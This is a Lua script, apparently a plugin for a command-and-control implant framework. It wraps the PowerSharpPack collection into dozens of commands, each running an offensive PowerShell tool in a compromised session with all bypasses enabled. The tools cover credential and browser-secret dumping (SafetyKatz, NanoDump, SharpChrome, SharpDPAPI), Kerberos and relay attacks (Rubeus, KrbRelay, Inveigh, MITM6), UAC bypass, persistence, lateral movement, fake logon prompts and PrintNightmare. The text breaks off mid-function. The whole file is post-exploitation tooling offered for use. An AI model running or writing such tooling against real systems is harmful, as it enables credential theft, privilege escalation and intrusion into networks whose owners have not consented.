-- Invoke-BadPotato
local function run_Invoke_BadPotato(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-BadPotato"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-BadPotato", run_Invoke_BadPotato, "powersharppack Invoke-BadPotato", "T1059.001")

-- Invoke-BetterSafetyKatz
local function run_Invoke_BetterSafetyKatz(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-BetterSafetyKatz"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-BetterSafetyKatz.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-BetterSafetyKatz", run_Invoke_BetterSafetyKatz, "powersharppack Invoke-BetterSafetyKatz", "T1059.001")

-- Invoke-Carbuncle
local function run_Invoke_Carbuncle(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Carbuncle"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Carbuncle.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Carbuncle", run_Invoke_Carbuncle, "powersharppack Invoke-Carbuncle", "T1059.001")

-- Invoke-Certify
local function run_Invoke_Certify(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Certify"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Certify.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Certify", run_Invoke_Certify, "powersharppack Invoke-Certify", "T1059.001")

-- Invoke-DAFT
local function run_Invoke_DAFT(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-DAFT"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-DAFT.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-DAFT", run_Invoke_DAFT, "powersharppack Invoke-DAFT", "T1059.001")

-- Invoke-DinvokeKatz
local function run_Invoke_DinvokeKatz(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-DinvokeKatz"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-DinvokeKatz.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-DinvokeKatz", run_Invoke_DinvokeKatz, "powersharppack Invoke-DinvokeKatz", "T1059.001")

-- Invoke-Eyewitness
local function run_Invoke_Eyewitness(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Eyewitness"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Eyewitness.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Eyewitness", run_Invoke_Eyewitness, "powersharppack Invoke-Eyewitness", "T1059.001")

-- Invoke-FakeLogonScreen
local function run_Invoke_FakeLogonScreen(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-FakeLogonScreen"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-FakeLogonScreen.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-FakeLogonScreen", run_Invoke_FakeLogonScreen, "powersharppack Invoke-FakeLogonScreen", "T1059.001")

-- Invoke-Farmer
local function run_Invoke_Farmer(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Farmer"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Farmer.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Farmer", run_Invoke_Farmer, "powersharppack Invoke-Farmer", "T1059.001")

-- Invoke-Get-RBCD-Threaded
local function run_Invoke_Get_RBCD_Threaded(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Get-RBCD-Threaded"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Get-RBCD-Threaded", run_Invoke_Get_RBCD_Threaded, "powersharppack Invoke-Get-RBCD-Threaded", "T1059.001")

-- Invoke-Gopher
local function run_Invoke_Gopher(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Gopher"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Gopher.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Gopher", run_Invoke_Gopher, "powersharppack Invoke-Gopher", "T1059.001")

-- Invoke-Grouper2
local function run_Invoke_Grouper2(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Grouper2"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Grouper2.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Grouper2", run_Invoke_Grouper2, "powersharppack Invoke-Grouper2", "T1059.001")

-- Invoke-Grouper3
local function run_Invoke_Grouper3(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Grouper3"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Grouper3.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Grouper3", run_Invoke_Grouper3, "powersharppack Invoke-Grouper3", "T1059.001")

-- Invoke-HandleKatz
local function run_Invoke_HandleKatz(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-HandleKatz"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-HandleKatz.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-HandleKatz", run_Invoke_HandleKatz, "powersharppack Invoke-HandleKatz", "T1059.001")

-- Invoke-Internalmonologue
local function run_Invoke_Internalmonologue(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Internalmonologue"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Internalmonologue.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Internalmonologue", run_Invoke_Internalmonologue, "powersharppack Invoke-Internalmonologue", "T1059.001")

-- Invoke-Inveigh
local function run_Invoke_Inveigh(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Inveigh"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Inveigh.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Inveigh", run_Invoke_Inveigh, "powersharppack Invoke-Inveigh", "T1059.001")

-- Invoke-KrbRelay
local function run_Invoke_KrbRelay(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-KrbRelay"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-KrbRelay.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-KrbRelay", run_Invoke_KrbRelay, "powersharppack Invoke-KrbRelay", "T1059.001")

-- Invoke-LdapSignCheck
local function run_Invoke_LdapSignCheck(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-LdapSignCheck"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-LdapSignCheck.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-LdapSignCheck", run_Invoke_LdapSignCheck, "powersharppack Invoke-LdapSignCheck", "T1059.001")

-- Invoke-Lockless
local function run_Invoke_Lockless(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Lockless"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Lockless.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Lockless", run_Invoke_Lockless, "powersharppack Invoke-Lockless", "T1059.001")

-- Invoke-MalSCCM
local function run_Invoke_MalSCCM(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-MalSCCM"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-MalSCCM.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-MalSCCM", run_Invoke_MalSCCM, "powersharppack Invoke-MalSCCM", "T1059.001")

-- Invoke-MITM6
local function run_Invoke_MITM6(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-MITM6"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-MITM6.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-MITM6", run_Invoke_MITM6, "powersharppack Invoke-MITM6", "T1059.001")

-- Invoke-NanoDump
local function run_Invoke_NanoDump(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-NanoDump"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-NanoDump.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-NanoDump", run_Invoke_NanoDump, "powersharppack Invoke-NanoDump", "T1059.001")

-- Invoke-OxidResolver
local function run_Invoke_OxidResolver(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-OxidResolver"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-OxidResolver.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-OxidResolver", run_Invoke_OxidResolver, "powersharppack Invoke-OxidResolver", "T1059.001")

-- Invoke-P0wnedshell
local function run_Invoke_P0wnedshell(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-P0wnedshell"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-P0wnedshell.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-P0wnedshell", run_Invoke_P0wnedshell, "powersharppack Invoke-P0wnedshell", "T1059.001")

-- Invoke-P0wnedshellx86
local function run_Invoke_P0wnedshellx86(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-P0wnedshellx86"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-P0wnedshellx86.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-P0wnedshellx86", run_Invoke_P0wnedshellx86, "powersharppack Invoke-P0wnedshellx86", "T1059.001")

-- Invoke-Postdump
local function run_Invoke_Postdump(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Postdump"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Postdump.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Postdump", run_Invoke_Postdump, "powersharppack Invoke-Postdump", "T1059.001")

-- Invoke-PPLDump
local function run_Invoke_PPLDump(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-PPLDump"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-PPLDump.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-PPLDump", run_Invoke_PPLDump, "powersharppack Invoke-PPLDump", "T1059.001")

-- Invoke-Rubeus
local function run_Invoke_Rubeus(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Rubeus"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Rubeus.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Rubeus", run_Invoke_Rubeus, "powersharppack Invoke-Rubeus", "T1059.001")

-- Invoke-SafetyKatz
local function run_Invoke_SafetyKatz(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SafetyKatz"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SafetyKatz.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SafetyKatz", run_Invoke_SafetyKatz, "powersharppack Invoke-SafetyKatz", "T1059.001")

-- Invoke-SauronEye
local function run_Invoke_SauronEye(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SauronEye"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SauronEye.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SauronEye", run_Invoke_SauronEye, "powersharppack Invoke-SauronEye", "T1059.001")

-- Invoke-SCShell
local function run_Invoke_SCShell(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SCShell"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SCShell.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SCShell", run_Invoke_SCShell, "powersharppack Invoke-SCShell", "T1059.001")

-- Invoke-Seatbelt
local function run_Invoke_Seatbelt(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Seatbelt"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Seatbelt.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Seatbelt", run_Invoke_Seatbelt, "powersharppack Invoke-Seatbelt", "T1059.001")

-- Invoke-ShadowSpray
local function run_Invoke_ShadowSpray(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-ShadowSpray"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-ShadowSpray.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-ShadowSpray", run_Invoke_ShadowSpray, "powersharppack Invoke-ShadowSpray", "T1059.001")

-- Invoke-SharpAllowedToAct
local function run_Invoke_SharpAllowedToAct(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpAllowedToAct"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpAllowedToAct.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpAllowedToAct", run_Invoke_SharpAllowedToAct, "powersharppack Invoke-SharpAllowedToAct", "T1059.001")

-- Invoke-SharpBlock
local function run_Invoke_SharpBlock(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpBlock"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpBlock.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpBlock", run_Invoke_SharpBlock, "powersharppack Invoke-SharpBlock", "T1059.001")

-- Invoke-SharpBypassUAC
local function run_Invoke_SharpBypassUAC(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpBypassUAC"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpBypassUAC.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpBypassUAC", run_Invoke_SharpBypassUAC, "powersharppack Invoke-SharpBypassUAC", "T1059.001")

-- Invoke-SharpChrome
local function run_Invoke_SharpChrome(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpChrome"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpChrome.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpChrome", run_Invoke_SharpChrome, "powersharppack Invoke-SharpChrome", "T1059.001")

-- Invoke-SharpChromium
local function run_Invoke_SharpChromium(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpChromium"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpChromium.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpChromium", run_Invoke_SharpChromium, "powersharppack Invoke-SharpChromium", "T1059.001")

-- Invoke-SharpClipboard
local function run_Invoke_SharpClipboard(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpClipboard"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpClipboard.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpClipboard", run_Invoke_SharpClipboard, "powersharppack Invoke-SharpClipboard", "T1059.001")

-- Invoke-SharpCloud
local function run_Invoke_SharpCloud(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpCloud"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpCloud.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpCloud", run_Invoke_SharpCloud, "powersharppack Invoke-SharpCloud", "T1059.001")

-- Invoke-SharpDPAPI
local function run_Invoke_SharpDPAPI(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpDPAPI"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpDPAPI.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpDPAPI", run_Invoke_SharpDPAPI, "powersharppack Invoke-SharpDPAPI", "T1059.001")

-- Invoke-SharpDump
local function run_Invoke_SharpDump(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpDump"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpDump.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpDump", run_Invoke_SharpDump, "powersharppack Invoke-SharpDump", "T1059.001")

-- Invoke-SharPersist
local function run_Invoke_SharPersist(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharPersist"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharPersist.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharPersist", run_Invoke_SharPersist, "powersharppack Invoke-SharPersist", "T1059.001")

-- Invoke-SharpGPO-RemoteAccessPolicies
local function run_Invoke_SharpGPO_RemoteAccessPolicies(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpGPO-RemoteAccessPolicies"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpGPO-RemoteAccessPolicies.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpGPO-RemoteAccessPolicies", run_Invoke_SharpGPO_RemoteAccessPolicies, "powersharppack Invoke-SharpGPO-RemoteAccessPolicies", "T1059.001")

-- Invoke-SharpGPOAbuse
local function run_Invoke_SharpGPOAbuse(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpGPOAbuse"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpGPOAbuse.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpGPOAbuse", run_Invoke_SharpGPOAbuse, "powersharppack Invoke-SharpGPOAbuse", "T1059.001")

-- Invoke-SharpHandler
local function run_Invoke_SharpHandler(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpHandler"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpHandler.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpHandler", run_Invoke_SharpHandler, "powersharppack Invoke-SharpHandler", "T1059.001")

-- Invoke-SharpHide
local function run_Invoke_SharpHide(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpHide"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpHide.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpHide", run_Invoke_SharpHide, "powersharppack Invoke-SharpHide", "T1059.001")

-- Invoke-Sharphound2
local function run_Invoke_Sharphound2(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharphound2"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharphound2.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharphound2", run_Invoke_Sharphound2, "powersharppack Invoke-Sharphound2", "T1059.001")

-- Invoke-Sharphound3
local function run_Invoke_Sharphound3(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharphound3"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharphound3.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharphound3", run_Invoke_Sharphound3, "powersharppack Invoke-Sharphound3", "T1059.001")

-- Invoke-SharpHound4
local function run_Invoke_SharpHound4(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpHound4"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpHound4.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpHound4", run_Invoke_SharpHound4, "powersharppack Invoke-SharpHound4", "T1059.001")

-- Invoke-SharpImpersonation
local function run_Invoke_SharpImpersonation(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpImpersonation"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpImpersonation.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpImpersonation", run_Invoke_SharpImpersonation, "powersharppack Invoke-SharpImpersonation", "T1059.001")

-- Invoke-SharpImpersonationNoSpace
local function run_Invoke_SharpImpersonationNoSpace(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpImpersonationNoSpace"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpImpersonationNoSpace.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpImpersonationNoSpace", run_Invoke_SharpImpersonationNoSpace, "powersharppack Invoke-SharpImpersonationNoSpace", "T1059.001")

-- Invoke-SharpKatz
local function run_Invoke_SharpKatz(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpKatz"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpKatz.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpKatz", run_Invoke_SharpKatz, "powersharppack Invoke-SharpKatz", "T1059.001")

-- Invoke-SharpLdapRelayScan
local function run_Invoke_SharpLdapRelayScan(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpLdapRelayScan"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpLdapRelayScan.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpLdapRelayScan", run_Invoke_SharpLdapRelayScan, "powersharppack Invoke-SharpLdapRelayScan", "T1059.001")

-- Invoke-Sharplocker
local function run_Invoke_Sharplocker(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharplocker"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharplocker.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharplocker", run_Invoke_Sharplocker, "powersharppack Invoke-Sharplocker", "T1059.001")

-- Invoke-SharpLoginPrompt
local function run_Invoke_SharpLoginPrompt(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpLoginPrompt"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpLoginPrompt.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpLoginPrompt", run_Invoke_SharpLoginPrompt, "powersharppack Invoke-SharpLoginPrompt", "T1059.001")

-- Invoke-SharpMove
local function run_Invoke_SharpMove(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpMove"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpMove.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpMove", run_Invoke_SharpMove, "powersharppack Invoke-SharpMove", "T1059.001")

-- Invoke-SharpPrinter
local function run_Invoke_SharpPrinter(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpPrinter"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpPrinter.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpPrinter", run_Invoke_SharpPrinter, "powersharppack Invoke-SharpPrinter", "T1059.001")

-- Invoke-SharpPrintNightmare
local function run_Invoke_SharpPrintNightmare(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpPrintNightmare"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpPrintNightmare.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpPrintNightmare", run_Invoke_SharpPrintNightmare, "powersharppack Invoke-SharpPrintNightmare", "T1059.001")

-- Invoke-SharpRDP
local function run_Invoke_SharpRDP(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpRDP"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpRDP.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpRDP", run_Invoke_SharpRDP, "powersharppack Invoke-SharpRDP", "T1059.001")

-- Invoke-SharpSCCM
local function run_Invoke_SharpSCCM(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpSCCM"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpSCCM.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpSCCM", run_Invoke_SharpSCCM, "powersharppack Invoke-SharpSCCM", "T1059.001")

-- Invoke-SharpSecDump
local function run_Invoke_SharpSecDump(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpSecDump"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpSecDump.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpSecDump", run_Invoke_SharpSecDump, "powersharppack Invoke-SharpSecDump", "T1059.001")

-- Invoke-Sharpshares
local function run_Invoke_Sharpshares(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharpshares"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharpshares.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharpshares", run_Invoke_Sharpshares, "powersharppack Invoke-Sharpshares", "T1059.001")

-- Invoke-SharpSniper
local function run_Invoke_SharpSniper(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpSniper"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpSniper.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpSniper", run_Invoke_SharpSniper, "powersharppack Invoke-SharpSniper", "T1059.001")

-- Invoke-Sharpsploit_nomimi
local function run_Invoke_Sharpsploit_nomimi(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-Sharpsploit_nomimi"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-Sharpsploit_nomimi.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-Sharpsploit_nomimi", run_Invoke_Sharpsploit_nomimi, "powersharppack Invoke-Sharpsploit_nomimi", "T1059.001")

-- Invoke-SharpSploit
local function run_Invoke_SharpSploit(args)
    local session = active()
    local arch = session.Os.Arch
    local function_name = "Invoke-SharpSploit"
    local ps_script = script_resource("PowerSharpPack/PowerSharpBinaries/Invoke-SharpSploit.ps1")
    return powerpick(session, ps_script, {function_name, unpack(args)}, new_bypass_all())
end
command("powersharppack:Invoke-SharpSploit", run_Invoke_SharpSploit, "powersharppack Invoke-SharpSploit", "T1059.001")

-- Invoke-SharpSpray
local function run_Invoke_SharpSpray(args)
    local session = active()
